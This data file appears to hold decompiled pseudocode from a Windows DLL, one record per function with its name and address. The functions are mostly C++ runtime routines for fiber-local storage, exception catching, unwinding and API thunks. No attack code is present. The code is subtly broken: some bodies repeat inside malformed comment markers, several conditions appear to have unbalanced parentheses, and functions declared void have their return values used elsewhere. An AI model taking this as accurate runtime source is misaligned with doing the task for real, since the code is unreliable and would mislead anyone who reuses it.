{"Function Name": "___vcrt_getptd_noexit", "Address": "1001a231", "Source Code": "LPVOID ___vcrt_getptd_noexit(void) \n{\n    DWORD lastErrorCode; \n    LPVOID threadLocalStorageValue;   \n    LPVOID allocatedMemory;   \n    if (DAT_1004e090 == 0xffffffff) { \n        return (LPVOID)0x0; \n    }\n    lastErrorCode = GetLastError(); \n    threadLocalStorageValue = (LPVOID)___vcrt_FlsGetValue(DAT_1004e090); \n    if (threadLocalStorageValue == (LPVOID)0xffffffff) { \n        return (LPVOID)0x0; \n    }\n    if (threadLocalStorageValue != (LPVOID)0x0) { \n        goto LAB_1001a2b7; \n    }\n    if (___vcrt_FlsSetValue(DAT_1004e090, (LPVOID)0xffffffff) == 0) { \n        return (LPVOID)0x0; \n    }\n    allocatedMemory = (LPVOID)FUN_1001df20(1, 0x28); \n    if (allocatedMemory == (LPVOID)0x0) { \n        ___vcrt_FlsSetValue(DAT_1004e090, (LPVOID)0x0); \n        return (LPVOID)0x0; \n    }\n    if (___vcrt_FlsSetValue(DAT_1004e090, allocatedMemory) == 0) { \n        ___vcrt_FlsSetValue(DAT_1004e090, (LPVOID)0x0); \n        return (LPVOID)0x0; \n    }\n    FUN_1001dc78((void *)0x0); \nLAB_1001a2b7: \n    SetLastError(lastErrorCode); \n    return threadLocalStorageValue; \n}"}
{"Function Name": "___vcrt_getptd_noinit", "Address": "1001a2c3", "Source Code": "uint ___vcrt_getptd_noinit(void)\n{\n    \n    if (globalVariable == 0xffffffff) {\n        \n        return 0;\n    }\n    \n    \n    uint retrievedValue = ___vcrt_FlsGetValue(globalVariable);\n    \n    \n    return -(uint)(retrievedValue != 0xffffffff) & retrievedValue;\n}"}
{"Function Name": "___vcrt_initialize_ptd", "Address": "1001a2fa", "Source Code": "uint ___vcrt_initialize_ptd(void)\n{\n    \n    uint flsIndex = ___vcrt_FlsAlloc(___vcrt_freefls_4);\n    \n    \n    globalFlsIndex = flsIndex;\n    \n    \n    if (flsIndex != 0xffffffff) {\n        \n        if (___vcrt_FlsSetValue(flsIndex, &flsValue) != 0) {\n            \n            return 1;\n        }\n        \n        flsIndex = ___vcrt_uninitialize_ptd();\n    }\n    \n    \n    return flsIndex & 0xffffff00;\n}"}
{"Function Name": "BuildCatchObjectHelperInternal<>", "Address": "1001a348", "Source Code": "\\*\nint __cdecl\nBuildCatchObjectHelperInternal<>(int param_1, undefined8 *param_2, uint *param_3, byte *param_4)\n{\n    code *pcVar1 = DAT_1004fd1c; \n    int iVar2; \n    uint uVar4; \n    \n    if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\\0')) ||\n        ((param_3[2] == 0 && (-1 < (int)*param_3)))) {\n        return 0; \n    }\n    \n    uVar4 = *param_3; \n    if (-1 < (int)uVar4) { \n        param_2 = (undefined8 *)((int)param_2 + param_3[2] + 0xc); \n    }\n    \n    \n    if ((((char)uVar4 < '\\0') && ((*param_4 & 0x10) != 0)) && (pcVar1 != (code *)0x0)) {\n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        iVar2 = (*pcVar1)(); \n    } else {\n        \n        if ((uVar4 & 8) == 0) {\n            \n            if ((*param_4 & 1) == 0) {\n                \n                if (*(int *)(param_4 + 0x18) == 0) {\n                    \n                    if ((*(int *)(param_1 + 0x18) != 0) && (param_2 != (undefined8 *)0x0)) {\n                        uVar4 = *(uint *)(param_4 + 0x14); \n                        undefined8 *puVar3 = (undefined8 *)___AdjustPointer(*(int *)(param_1 + 0x18), (int *)(param_4 + 8)); \n                        FUN_10018bf0(param_2, puVar3, uVar4); \n                        return 0; \n                    }\n                } else if ((*(int *)(param_1 + 0x18) != 0) && (param_2 != (undefined8 *)0x0)) {\n                    return ((*param_4 & 4) != 0) + 1; \n                }\n                goto LAB_1001a481; \n            }\n            \n            if ((*(int *)(param_1 + 0x18) == 0) || (param_2 == (undefined8 *)0x0)) goto LAB_1001a481; \n            FUN_10018bf0(param_2, *(undefined8 **)(param_1 + 0x18), *(uint *)(param_4 + 0x14)); \n            \n            if (*(int *)(param_4 + 0x14) != 4) {\n                return 0; \n            }\n            \n            if (*(int *)param_2 == 0) {\n                return 0; \n            }\n            iVar2 = *(int *)param_2; \n            goto LAB_1001a40f; \n        }\n        iVar2 = *(int *)(param_1 + 0x18); \n    }\n    \n    \n    if ((iVar2 == 0) || (param_2 == (undefined8 *)0x0)) {\nLAB_1001a481: \n        _terminate(); \n        pcVar1 = (code *)swi(3); \n        iVar2 = (*pcVar1)(); \n        return iVar2; \n    }\n    \n    *(int *)param_2 = iVar2; \nLAB_1001a40f: \n    iVar2 = ___AdjustPointer(iVar2, (int *)(param_4 + 8)); \n    *(int *)param_2 = iVar2; \n    return 0; \n}\n*\\ \n \nint __cdecl\nBuildCatchObjectHelperInternal<>(int param_1, undefined8 *param_2, uint *param_3, byte *param_4)\n{\n    code *pcVar1 = DAT_1004fd1c;\n    int iVar2;\n    uint uVar4;\n    if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\\0')) ||\n        ((param_3[2] == 0 && (-1 < (int)*param_3)))) {\n        return 0;\n    }\n    \n    uVar4 = *param_3;\n    if (-1 < (int)uVar4) {\n        param_2 = (undefined8 *)((int)param_2 + param_3[2] + 0xc);\n    }\n    \n    if ((((char)uVar4 < '\\0') && ((*param_4 & 0x10) != 0)) && (pcVar1 != (code *)0x0)) {\n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        iVar2 = (*pcVar1)();\n    } else {\n        if ((uVar4 & 8) == 0) {\n            if ((*param_4 & 1) == 0) {\n                if (*(int *)(param_4 + 0x18) == 0) {\n                    if ((*(int *)(param_1 + 0x18) != 0) && (param_2 != (undefined8 *)0x0)) {\n                        uVar4 = *(uint *)(param_4 + 0x14);\n                        undefined8 *puVar3 = (undefined8 *)___AdjustPointer(*(int *)(param_1 + 0x18), (int *)(param_4 + 8));\n                        FUN_10018bf0(param_2, puVar3, uVar4);\n                        return 0;\n                    }\n                } else if ((*(int *)(param_1 + 0x18) != 0) && (param_2 != (undefined8 *)0x0)) {\n                    return ((*param_4 & 4) != 0) + 1;\n                }\n                goto LAB_1001a481;\n            }\n            if ((*(int *)(param_1 + 0x18) == 0) || (param_2 == (undefined8 *)0x0)) goto LAB_1001a481;\n            FUN_10018bf0(param_2, *(undefined8 **)(param_1 + 0x18), *(uint *)(param_4 + 0x14));\n            if (*(int *)(param_4 + 0x14) != 4) {\n                return 0;\n            }\n            if (*(int *)param_2 == 0) {\n                return 0;\n            }\n            iVar2 = *(int *)param_2;\n            goto LAB_1001a40f;\n        }\n        iVar2 = *(int *)(param_1 + 0x18);\n    }\n    \n    if ((iVar2 == 0) || (param_2 == (undefined8 *)0x0)) {\nLAB_1001a481:\n        _terminate();\n        pcVar1 = (code *)swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    \n    *(int *)param_2 = iVar2;\nLAB_1001a40f:\n    iVar2 = ___AdjustPointer(iVar2, (int *)(param_4 + 8));\n    *(int *)param_2 = iVar2;\n    return 0;\n}"}
{"Function Name": "BuildCatchObjectInternal<struct__s_HandlerType_const_>", "Address": "1001a487", "Source Code": "\\*\nvoid __cdecl\nBuildCatchObjectInternal<struct__s_HandlerType_const_>\n(EHExceptionRecord *param_1, void *param_2, _s_HandlerType *param_3, _s_CatchableType *param_4)\n{\n    void *pvVar3 = param_2; \n    if (-1 < (int)param_3->adjectives) { \n        \n        pvVar3 = (void *)((int)param_2 + param_3->dispCatchObj + 0xc);\n    }\n    \n    \n    int iVar1 = BuildCatchObjectHelperInternal<>\n    ((int)param_1, (undefined8 *)param_2, &param_3->adjectives, (byte *)param_4);\n    \n    \n    void *pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18), (int *)(param_4 + 8));\n    \n    \n    if (iVar1 == 1) {\n        _CallMemberFunction1(pvVar3, *(void **)(param_4 + 0x18), pvVar2);\n    } else if (iVar1 == 2) {\n        _CallMemberFunction2(pvVar3, *(void **)(param_4 + 0x18), pvVar2, 1);\n    }\n    \n    return; \n}\n*\\ \n \nvoid __cdecl\nBuildCatchObjectInternal<struct__s_HandlerType_const_>\n(EHExceptionRecord *param_1, void *param_2, _s_HandlerType *param_3, _s_CatchableType *param_4)\n{\n    void *pvVar3 = param_2;\n    if (-1 < (int)param_3->adjectives) {\n        pvVar3 = (void *)((int)param_2 + param_3->dispCatchObj + 0xc);\n    }\n    \n    int iVar1 = BuildCatchObjectHelperInternal<>\n    ((int)param_1, (undefined8 *)param_2, &param_3->adjectives, (byte *)param_4);\n    \n    void *pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18), (int *)(param_4 + 8));\n    \n    if (iVar1 == 1) {\n        _CallMemberFunction1(pvVar3, *(void **)(param_4 + 0x18), pvVar2);\n    } else if (iVar1 == 2) {\n        _CallMemberFunction2(pvVar3, *(void **)(param_4 + 0x18), pvVar2, 1);\n    }\n    \n    return;\n}"}
{"Function Name": "CatchIt<class___FrameHandler3>", "Address": "1001a520", "Source Code": "\\*\nvoid __cdecl\nCatchIt<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, _s_HandlerType *param_6, _s_CatchableType *param_7,\n_s_TryBlockMapEntry *param_8, int param_9, EHRegistrationNode *param_10, uchar param_11)\n{\n    \n    if (param_7 != (_s_CatchableType *)0x0) {\n        \n        BuildCatchObjectInternal<struct__s_HandlerType_const_>(param_1, param_2, param_6, param_7);\n    }\n    \n    \n    if (param_10 == (EHRegistrationNode *)0x0) {\n        param_10 = param_2;\n    }\n    \n    \n    _UnwindNestedFrames(param_10, param_1);\n    \n    \n    __FrameHandler3::FrameUnwindToState(param_2, param_4, param_5, param_8->tryLow);\n    \n    \n    __FrameHandler3::SetState(param_2, param_5, param_8->tryHigh + 1);\n    \n    \n    void *pvVar1 = CallCatchBlock(param_1, param_2, param_3, param_5, param_6->addressOfHandler, param_9, 0x100);\n    \n    \n    if (pvVar1 != (void *)0x0) {\n        _JumpToContinuation(pvVar1, param_2);\n    }\n}\n*\\ \n \nvoid __cdecl\nCatchIt<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, _s_HandlerType *param_6, _s_CatchableType *param_7,\n_s_TryBlockMapEntry *param_8, int param_9, EHRegistrationNode *param_10, uchar param_11)\n{\n    if (param_7 != (_s_CatchableType *)0x0) {\n        BuildCatchObjectInternal<struct__s_HandlerType_const_>(param_1, param_2, param_6, param_7);\n    }\n    if (param_10 == (EHRegistrationNode *)0x0) {\n        param_10 = param_2;\n    }\n    _UnwindNestedFrames(param_10, param_1);\n    __FrameHandler3::FrameUnwindToState(param_2, param_4, param_5, param_8->tryLow);\n    __FrameHandler3::SetState(param_2, param_5, param_8->tryHigh + 1);\n    void *pvVar1 = CallCatchBlock(param_1, param_2, param_3, param_5, param_6->addressOfHandler, param_9, 0x100);\n    if (pvVar1 != (void *)0x0) {\n        _JumpToContinuation(pvVar1, param_2);\n    }\n}"}
{"Function Name": "TypeMatchHelper<struct__s_HandlerType_const_>", "Address": "1001aa3f", "Source Code": "\\*\nint __cdecl\nTypeMatchHelper<struct__s_HandlerType_const_>\n(_s_HandlerType *param_1,_s_CatchableType *param_2,_s_ThrowInfo *param_3)\n{\n    TypeDescriptor *pTVar3 = param_1->pType; \n    TypeDescriptor *pTVar5; \n    uint uVar4; \n    int iVar6 = 0; \n    \n    if (pTVar3 == (TypeDescriptor *)0x0 || (pTVar5 = pTVar3 + 1, *(char *)&pTVar5->pVFTable == '\\0') ||\n        ((*(byte *)&param_1->adjectives & 0x80) != 0 && (((byte)*param_2 & 0x10) != 0)))) {\n        return 1; \n    }\n    \n    if (pTVar3 != *(TypeDescriptor **)(param_2 + 4)) {\n        pTVar3 = *(TypeDescriptor **)(param_2 + 4) + 1; \n        do {\n            \n            if (*(byte *)&pTVar5->pVFTable != *(byte *)&pTVar3->pVFTable) {\n                uVar4 = -((*(byte *)&pTVar5->pVFTable < *(byte *)&pTVar3->pVFTable)) | 1; \n                if (uVar4 != 0) {\n                    return 0; \n                }\n            }\n            if (*(byte *)&pTVar5->pVFTable == 0) break; \n            pTVar5 = (TypeDescriptor *)((int)&pTVar5->pVFTable + 2); \n            pTVar3 = (TypeDescriptor *)((int)&pTVar3->pVFTable + 2); \n        } while (1); \n    }\n    \n    if (((byte)*param_2 & 2) == 0 || (*(byte *)&param_1->adjectives & 8) != 0) {\n        if ((((byte)*param_3 & 1) == 0 || (*(byte *)&param_1->adjectives & 1) != 0) &&\n            (((byte)*param_3 & 2) == 0 || (*(byte *)&param_1->adjectives & 2) != 0))) {\n            return 1; \n        }\n    }\n    return iVar6; \n}\n*\\ \n \nint __cdecl\nTypeMatchHelper<struct__s_HandlerType_const_>\n(_s_HandlerType *param_1,_s_CatchableType *param_2,_s_ThrowInfo *param_3)\n{\n    TypeDescriptor *pTVar3 = param_1->pType;\n    TypeDescriptor *pTVar5;\n    uint uVar4;\n    int iVar6 = 0;\n    if (pTVar3 == (TypeDescriptor *)0x0 || (pTVar5 = pTVar3 + 1, *(char *)&pTVar5->pVFTable == '\\0') ||\n        ((*(byte *)&param_1->adjectives & 0x80) != 0 && (((byte)*param_2 & 0x10) != 0)))) {\n        return 1;\n    }\n    if (pTVar3 != *(TypeDescriptor **)(param_2 + 4)) {\n        pTVar3 = *(TypeDescriptor **)(param_2 + 4) + 1;\n        do {\n            if (*(byte *)&pTVar5->pVFTable != *(byte *)&pTVar3->pVFTable) {\n                uVar4 = -((*(byte *)&pTVar5->pVFTable < *(byte *)&pTVar3->pVFTable)) | 1;\n                if (uVar4 != 0) {\n                    return 0;\n                }\n            }\n            if (*(byte *)&pTVar5->pVFTable == 0) break;\n            pTVar5 = (TypeDescriptor *)((int)&pTVar5->pVFTable + 2);\n            pTVar3 = (TypeDescriptor *)((int)&pTVar3->pVFTable + 2);\n        } while (1);\n    }\n    if (((byte)*param_2 & 2) == 0 || (*(byte *)&param_1->adjectives & 8) != 0) {\n        if ((((byte)*param_3 & 1) == 0 || (*(byte *)&param_1->adjectives & 1) != 0) &&\n            (((byte)*param_3 & 2) == 0 || (*(byte *)&param_1->adjectives & 2) != 0))) {\n            return 1;\n        }\n    }\n    return iVar6;\n}"}
{"Function Name": "__InternalCxxFrameHandler<class___FrameHandler3>", "Address": "1001aacd", "Source Code": "\\*\n_EXCEPTION_DISPOSITION __cdecl\n__InternalCxxFrameHandler<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, int param_6, EHRegistrationNode *param_7, uchar param_8)\n{\n    code *pcVar1; \n    uint uVar3;   \n    \n    ___except_validate_context_record((int)param_3);\n    \n    \n    if (((*(int *)(___vcrt_getptd() + 0x20) != 0) || (*(int *)param_1 == -0x1f928c9d)) ||\n        (*(int *)param_1 == -0x7fffffda)) ||\n        (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522) ||\n        ((*(byte *)&param_5->EHFlags & 1) == 0))) {\n        \n        \n        if (((byte)param_1[4] & 0x66) == 0) {\n            \n            if (((param_5->nTryBlocks != 0) ||\n                ((uVar3 = param_5->magicNumber_and_bbtFlags & 0x1fffffff, \n                0x19930520 < uVar3 && (param_5->pESTypeList != (ESTypeList *)0x0)))) ||\n                (0x19930521 < uVar3 && (((uint)param_5->EHFlags >> 2 & 1) != 0)))) {\n                \n                \n                if (((*(int *)param_1 == -0x1f928c9d) && (2 < *(uint *)(param_1 + 0x10))) &&\n                    (0x19930522 < *(uint *)(param_1 + 0x14)) &&\n                    (pcVar1 = *(code **)(*(int *)(param_1 + 0x1c) + 8), pcVar1 != (code *)0x0)) {\n                    \n                    \n                    (*(code *)PTR__guard_check_icall_1003a2f8)\n                    (param_1, param_2, param_3, param_4, param_5, param_6, param_7, param_8);\n                    return (*pcVar1)(); \n                }\n                \n                FindHandler<class___FrameHandler3>\n                (param_1, param_2, param_3, param_4, param_5, param_8, param_6, param_7);\n            }\n        }\n    } else if ((param_5->maxState != 0) && (param_6 == 0)) {\n        \n        __FrameHandler3::FrameUnwindToEmptyState(param_2, param_4, param_5);\n    }\n    return 1; \n}\n*\\ \n \n_EXCEPTION_DISPOSITION __cdecl\n__InternalCxxFrameHandler<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, int param_6, EHRegistrationNode *param_7, uchar param_8)\n{\n    code *pcVar1;\n    uint uVar3;\n    ___except_validate_context_record((int)param_3);\n    if (((*(int *)(___vcrt_getptd() + 0x20) != 0) || (*(int *)param_1 == -0x1f928c9d)) ||\n        (*(int *)param_1 == -0x7fffffda)) ||\n        (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522) ||\n        ((*(byte *)&param_5->EHFlags & 1) == 0))) {\n        \n        if (((byte)param_1[4] & 0x66) == 0) {\n            if (((param_5->nTryBlocks != 0) ||\n                ((uVar3 = param_5->magicNumber_and_bbtFlags & 0x1fffffff, \n                0x19930520 < uVar3 && (param_5->pESTypeList != (ESTypeList *)0x0)))) ||\n                (0x19930521 < uVar3 && (((uint)param_5->EHFlags >> 2 & 1) != 0)))) {\n                \n                if (((*(int *)param_1 == -0x1f928c9d) && (2 < *(uint *)(param_1 + 0x10))) &&\n                    (0x19930522 < *(uint *)(param_1 + 0x14)) &&\n                    (pcVar1 = *(code **)(*(int *)(param_1 + 0x1c) + 8), pcVar1 != (code *)0x0)) {\n                    \n                    (*(code *)PTR__guard_check_icall_1003a2f8)\n                    (param_1, param_2, param_3, param_4, param_5, param_6, param_7, param_8);\n                    return (*pcVar1)();\n                }\n                FindHandler<class___FrameHandler3>\n                (param_1, param_2, param_3, param_4, param_5, param_8, param_6, param_7);\n            }\n        }\n    } else if ((param_5->maxState != 0) && (param_6 == 0)) {\n        __FrameHandler3::FrameUnwindToEmptyState(param_2, param_4, param_5);\n    }\n    return 1;\n}"}
{"Function Name": "FUN_1001abcf", "Address": "1001abcf", "Source Code": "\\*\nundefined4 * __thiscall FUN_1001abcf(void *object, int argument)\n{\n    \n    FUN_10001630(object, argument);\n    \n    \n    *(undefined ***)object = std::bad_exception::vftable;\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_1001abcf(void *object, int argument)\n{\n    FUN_10001630(object, argument);\n    *(undefined ***)object = std::bad_exception::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "__CallSettingFrame@12", "Address": "1001b040", "Source Code": "void __CallSettingFrame_12(undefined4 input_param_1, undefined4 input_param_2, int status_code)\n{\n    code *function_pointer; \n    function_pointer = (code *)__NLG_Notify1(status_code); \n    (*function_pointer)(); \n    if (status_code == 0x100) { \n        status_code = 2; \n    }\n    __NLG_Notify1(status_code); \n}"}
{"Function Name": "___except_validate_context_record", "Address": "1001b08c", "Source Code": "void __cdecl ___except_validate_context_record(int context_record)\n{\n    \n    if ((code *)guard_check_function_pointer != current_guard_check_function) {\n        \n        \n        \n        if ((*(uint *)(context_record + 0xc4) < *(uint *)((int)self_pointer + 8)) ||\n            (*(uint *)((int)self_pointer + 4) < *(uint *)(context_record + 0xc4))) {\n            \n            (*(code *)system_call(0x29))();\n        }\n    }\n}"}
{"Function Name": "___except_validate_jump_buffer", "Address": "1001b0bc", "Source Code": "void __cdecl ___except_validate_jump_buffer(int jump_buffer)\n{\n    \n    if ((code *)guard_check_icall_ptr != current_guard_check) {\n        \n        if ((*(uint *)(jump_buffer + 0x10) < *(uint *)((int)self_reference + 8)) || \n            (*(uint *)((int)self_reference + 4) < *(uint *)(jump_buffer + 0x10))) { \n            \n            ((code *)system_interrupt(0x29))();\n        }\n    }\n}"}
{"Function Name": "___vcrt_uninitialize_locks", "Address": "1001b130", "Source Code": "undefined4 ___vcrt_uninitialize_locks(void)\n{\n    LPCRITICAL_SECTION criticalSectionPtr; \n    if (criticalSectionCount != 0) { \n        criticalSectionPtr = (LPCRITICAL_SECTION)(&criticalSectionArray + criticalSectionCount * 0x18); \n        do {\n            DeleteCriticalSection(criticalSectionPtr); \n            criticalSectionCount--; \n            criticalSectionPtr--; \n        } while (criticalSectionCount != 0); \n    }\n    return 1; \n}"}
{"Function Name": "try_get_first_available_module", "Address": "1001b15f", "Source Code": "\\*\nHINSTANCE__ * __cdecl try_get_first_available_module(module_id *moduleId1,module_id *moduleId2)\n{\n    HINSTANCE__ **moduleHandlePointer; \n    HINSTANCE__ *loadedLibraryHandle; \n    LPCWSTR libraryFileName; \n    do {\n        \n        if (moduleId1 == moduleId2) {\n            return (HINSTANCE__ *)0x0; \n        }\n        \n        \n        moduleHandlePointer = (HINSTANCE__ **)(&DAT_1004fd68 + *moduleId1);\n        loadedLibraryHandle = *moduleHandlePointer; \n        \n        \n        if (loadedLibraryHandle == (HINSTANCE__ *)0x0) {\n            \n            libraryFileName = (LPCWSTR)(&PTR_u_api_ms_win_core_fibers_l1_1_1_1003d75c)[*moduleId1];\n            \n            loadedLibraryHandle = LoadLibraryExW(libraryFileName,(HANDLE)0x0,0x800);\n            \n            \n            if (loadedLibraryHandle == (HMODULE)0x0) {\n                \n                if (GetLastError() == 0x57 && \n                    _wcsncmp(libraryFileName,L\"api-ms-\",7) != 0 && \n                    _wcsncmp(libraryFileName,L\"ext-ms-\",7) != 0) {\n                    \n                    loadedLibraryHandle = LoadLibraryExW(libraryFileName,(HANDLE)0x0,0);\n                }\n                \n                \n                if (loadedLibraryHandle == (HMODULE)0x0) {\n                    LOCK(); \n                    *moduleHandlePointer = (HINSTANCE__ *)0xffffffff; \n                    UNLOCK(); \n                    goto LAB_1001b20c; \n                }\n            }\n            LOCK(); \n            *moduleHandlePointer = loadedLibraryHandle; \n            UNLOCK(); \n        } else {\n            LOCK(); \n            *moduleHandlePointer = loadedLibraryHandle; \n            UNLOCK(); \n        }\n        \n        \n        if (loadedLibraryHandle != (HINSTANCE__ *)0x0) {\n            return loadedLibraryHandle; \n        }\n        \n    LAB_1001b20c: \n        moduleId1 = moduleId1 + 1; \n    } while (true); \n}\n*\\ \n \nHINSTANCE__ * __cdecl try_get_first_available_module(module_id *moduleId1,module_id *moduleId2)\n{\nHINSTANCE__ **moduleHandlePointer;\nHINSTANCE__ *loadedLibraryHandle;\nLPCWSTR libraryFileName;\ndo {\n    if (moduleId1 == moduleId2) {\n        return (HINSTANCE__ *)0x0;\n    }\n    moduleHandlePointer = (HINSTANCE__ **)(&DAT_1004fd68 + *moduleId1);\n    loadedLibraryHandle = *moduleHandlePointer;\n    if (loadedLibraryHandle == (HINSTANCE__ *)0x0) {\n        libraryFileName = (LPCWSTR)(&PTR_u_api_ms_win_core_fibers_l1_1_1_1003d75c)[*moduleId1];\n        loadedLibraryHandle = LoadLibraryExW(libraryFileName,(HANDLE)0x0,0x800);\n        if (loadedLibraryHandle == (HMODULE)0x0) {\n            if (GetLastError() == 0x57 && \n                _wcsncmp(libraryFileName,L\"api-ms-\",7) != 0 && \n                _wcsncmp(libraryFileName,L\"ext-ms-\",7) != 0) {\n                loadedLibraryHandle = LoadLibraryExW(libraryFileName,(HANDLE)0x0,0);\n            }\n            if (loadedLibraryHandle == (HMODULE)0x0) {\n                LOCK();\n                *moduleHandlePointer = (HINSTANCE__ *)0xffffffff;\n                UNLOCK();\n                goto LAB_1001b20c;\n            }\n        }\n        LOCK();\n        *moduleHandlePointer = loadedLibraryHandle;\n        UNLOCK();\n    } else {\n        LOCK();\n        *moduleHandlePointer = loadedLibraryHandle;\n        UNLOCK();\n    }\n    if (loadedLibraryHandle != (HINSTANCE__ *)0x0) {\n        return loadedLibraryHandle;\n    }\nLAB_1001b20c:\n    moduleId1 = moduleId1 + 1;\n} while (true);\n}"}
{"Function Name": "try_get_function", "Address": "1001b223", "Source Code": "void * __cdecl\ntry_get_function(function_id param_1, char *param_2, module_id *param_3, module_id *param_4)\n{\n    \n    uint *puVar1 = &DAT_1004fd74 + param_1;\n    \n    \n    byte bVar3 = (byte)DAT_1004e008 & 0x1f;\n    \n    \n    FARPROC pFVar4 = (FARPROC)((DAT_1004e008 ^ *puVar1) >> bVar3 | (DAT_1004e008 ^ *puVar1) << 0x20 - bVar3);\n    \n    \n    if (pFVar4 == (FARPROC)0xffffffff) {\n        \n        pFVar4 = (FARPROC)0x0;\n    } else if (pFVar4 == (FARPROC)0x0) {\n        \n        HINSTANCE__ *hModule = try_get_first_available_module(param_3, param_4);\n        \n        \n        if (hModule == (HINSTANCE__ *)0x0 || (pFVar4 = GetProcAddress(hModule, param_2), pFVar4 == (FARPROC)0x0)) {\n            \n            LOCK();\n            \n            *puVar1 = __crt_fast_encode_pointer<>(0xffffffff);\n            \n            UNLOCK();\n            \n            pFVar4 = (FARPROC)0x0;\n        } else {\n            \n            LOCK();\n            \n            *puVar1 = __crt_fast_encode_pointer<>((uint)pFVar4);\n            \n            UNLOCK();\n        }\n    }\n    \n    return pFVar4;\n}"}
{"Function Name": "___vcrt_FlsFree", "Address": "1001b2cd", "Source Code": "void __cdecl ___vcrt_FlsFree(DWORD thread_id)\n{\n    \n    code *flsFreeFunctionPointer = (code *)try_get_function(1, \"FlsFree\", (module_id *)&DAT_1003d81c, (module_id *)&DAT_1003d824);\n    \n    \n    if (flsFreeFunctionPointer == (code *)0x0) {\n        \n        TlsFree(thread_id);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        (*flsFreeFunctionPointer)();\n    }\n}"}
{"Function Name": "___vcrt_FlsGetValue", "Address": "1001b308", "Source Code": "void __cdecl ___vcrt_FlsGetValue(DWORD thread_id)\n{\n    \n    code *function_address = (code *)try_get_function(2, \"FlsGetValue\", (module_id *)&module_base, (module_id *)&module_offset);\n    \n    \n    if (function_address == (code *)0x0) {\n        \n        TlsGetValue(thread_id);\n    } else {\n        \n        (*(code *)guard_check_function)();\n        \n        (*function_address)();\n    }\n}"}
{"Function Name": "___vcrt_FlsSetValue", "Address": "1001b343", "Source Code": "void __cdecl ___vcrt_FlsSetValue(DWORD thread_id, LPVOID value)\n{\n    \n    code *flsSetValuePtr = (code *)try_get_function(3, \"FlsSetValue\", (module_id *)&DAT_1003d82c, (module_id *)&DAT_1003d834);\n    \n    \n    if (flsSetValuePtr == (code *)0x0) {\n        \n        TlsSetValue(thread_id, value);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        (*flsSetValuePtr)();\n    }\n}"}
{"Function Name": "___vcrt_initialize_winapi_thunks", "Address": "1001b3c8", "Source Code": "void ___vcrt_initialize_winapi_thunks(void)\n{\n    undefined4 *dataPointer = &DAT_1004fd74; \n    for (int loopIndex = 0; loopIndex < 5; loopIndex++) { \n        *dataPointer++ = DAT_1004e008; \n    }\n}"}
{"Function Name": "__local_unwind4", "Address": "1001b430", "Source Code": "void __cdecl __local_unwind4(uint *inputPointer, int offset, uint limitValue)\n{\n    undefined4 *valuePointer; \n    uint currentValue; \n    void *savedExceptionList; \n    savedExceptionList = currentExceptionList; \n    currentExceptionList = &savedExceptionList; \n    while (true) { \n        currentValue = *(uint *)(offset + 0xc); \n        if ((currentValue == 0xfffffffe) || ((limitValue != 0xfffffffe && (currentValue <= limitValue)))) break; \n        valuePointer = (undefined4 *)((*(uint *)(offset + 8) ^ *inputPointer) + 0x10 + currentValue * 0xc); \n        *(undefined4 *)(offset + 0xc) = *valuePointer; \n        if (valuePointer[1] == 0) { \n            __NLG_Notify(0x101); \n            FUN_1001b71b(); \n        }\n    }\n    currentExceptionList = savedExceptionList; \n    return; \n}"}
{"Function Name": "@_EH4_CallFilterFunc@8", "Address": "1001b530", "Source Code": "void __fastcall __EH4_CallFilterFunc_8(undefined *function_pointer)\n{\n    \n    ((void (*)())function_pointer)();\n}"}
{"Function Name": "@_EH4_TransferToHandler@8", "Address": "1001b548", "Source Code": "void __fastcall __EH4_TransferToHandler_8(undefined *jumpTable)\n{\n    \n    __NLG_Notify(1);\n    \n    \n    (*(code *)jumpTable)();\n}"}
{"Function Name": "@_EH4_LocalUnwind@16", "Address": "1001b580", "Source Code": "void __fastcall __EH4_LocalUnwind_16(int input_value, uint flag, uint *data_pointer)\n{\n    \n    __local_unwind4(data_pointer, input_value, flag);\n}"}
{"Function Name": "_unexpected", "Address": "1001b597", "Source Code": "void _unexpected(void)\n{\n    \n    code *functionPointer = *(code **)(getThreadLocalData() + 4);\n    \n    \n    if (functionPointer != (code *)0x0) {\n        \n        (*(code *)guardCheckFunction)();\n        \n        \n        (*functionPointer)();\n    }\n    \n    \n    terminateProgram();\n    \n    \n    functionPointer = (code *)switchFunction(3);\n    \n    \n    (*functionPointer)();\n}"}
{"Function Name": "__global_unwind2", "Address": "1001b5e0", "Source Code": "void __cdecl __global_unwind2(PVOID target_frame)\n{\n    \n    \n    \n    \n    \n    RtlUnwind(target_frame, (PVOID)0x1001b5f9, NULL, NULL);\n}"}
